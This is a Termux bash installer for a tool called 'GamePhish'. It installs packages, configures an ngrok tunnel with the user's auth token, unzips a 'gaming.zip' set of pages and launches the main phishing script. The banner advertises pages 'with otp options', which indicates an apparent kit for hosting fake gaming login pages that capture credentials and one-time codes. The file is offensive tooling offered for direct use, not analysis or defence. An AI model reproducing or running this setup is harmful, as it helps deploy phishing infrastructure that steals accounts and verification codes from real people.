#basic packages install
#only one time install request pkgs
#make sure you have internet with speed
#coded by the jatin kalwar
clear
figlet YOURHACKINGHOUSE | lolcat
echo -e "\e[96m      |-----------------------[V 7.6]-----------------------|"
echo -e "\e[96m      |----------------------\e[92m V7.6\e[96m--------------------|"
echo -e "\e[96m      |-----------------------------------------------------|"
echo -e "\e[96m      |                                                     |"
echo -e "\e[96m      |            > latest pages with otp options         |"
echo -e "\e[96m      |            > Ngrok link status on screen            |"
echo -e "\e[96m      |            > Ngrok link issue fixed                 |"
echo -e "\e[96m      |            > New ChatNow button added               |"  
echo -e "\e[96m      |                                                     |"
echo -e "\e[96m      |-----------------------------------------------------|"
echo -e "\e[96m      |-----------------------\e[91mFEATURES\e[96m----------------------|"
echo -e "\e[96m      |-----------------------------------------------------|"
sleep 13.0
clear
echo -e "\e[96m      |------------[ INSTALLATION STARTED ]-----------------|"
echo -e "\e[96m      |-------[KEEP YOUR DEVICE AWAY FOR WHILE]-------------|"
sleep 8.0
apt-get update 
apt-get upgrade
echo " "
echo " "
echo -e "\e[92m      |------[SELECT OPTION (Y) to go forward]---------|"
echo " "
termux-setup-storage
pkg install git -y > /dev/null 2>&1
pkg install zip -y > /dev/null 2>&1
pkg install mpv -y > /dev/null 2>&1
pkg install wget -y > /dev/null 2>&1
pkg install openssh -y > /dev/null 2>&1
pkg install python -y > /dev/null 2>&1
pkg install python2 -y > /dev/null 2>&1
pkg install nano -y > /dev/null 2>&1
pkg install php -y > /dev/null 2>&1
pkg install pv -y > /dev/null 2>&1
pkg install figlet -y > /dev/null 2>&1
pip install lolcat 
cd /sdcard > /dev/null 2>&1
mkdir dUmpS > /dev/null 2>&1
cd $HOME/GamePhish > /dev/null 2>&1
mv log.mp3 /sdcard > /dev/null 2>&1
cd $HOME/GamePhish/core > /dev/null 2>&1
chmod +x ngrok > /dev/null 2>&1
mv ngrok $HOME > /dev/null 2>&1
cd $HOME > /dev/null 2>&1
clear
echo -e '\e[96m          [\e[92mNGROK SETUP\e[96m]--------------'
echo -e '\e[96m                           |'
echo -e '\e[92m    NGROK IS NOT WORKING WITH WIFI USERS BUT DONT WORRY'
echo -e '\e[92m    JUST PASTE AUTH CODE BY WATCHING VIDEO THEN YOU CAN'
echo -e '\e[92m        USE NGROK WITHOUT ANY ISSUE, GET LINK BELOW'
echo
echo -e '\e[92m      VIDEO LINK :- [ will update in next update ]'
echo
echo -e '\e[96m   EXAMPLE AUTH CODE - ./ngrok authtoken KavOb3e638hhs9 '
echo -e '\e[96m                           |'
echo -e '\e[96m                   JUST PASTE THIS PART'
echo -e '\e[96m  (dont copy paste this dummy one)- KavOb3e638hhs973ijsiwu'
echo -e '\e[96m                           |'
echo -e '\e[96m                           |'
sleep 8.0
clear
am start -a android.intent.action.VIEW -d https://www.ngrok.com
clear
read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] NGROK AUTH CODE : \e[0m' name
./ngrok authtoken $name
clear 
mv ngrok $HOME/GamePhish/core > /dev/null 2>&1
cd $HOME/GamePhish > /dev/null 2>&1
cd core/deploys > /dev/null 2>&1
unzip gaming.zip > /dev/null 2>&1
cd $HOME/GamePhish > /dev/null 2>&1
mpv /sdcard/log.mp3
rm setup > /dev/null 2>&1
cd $HOME/GamePhish
bash gamephish.sh
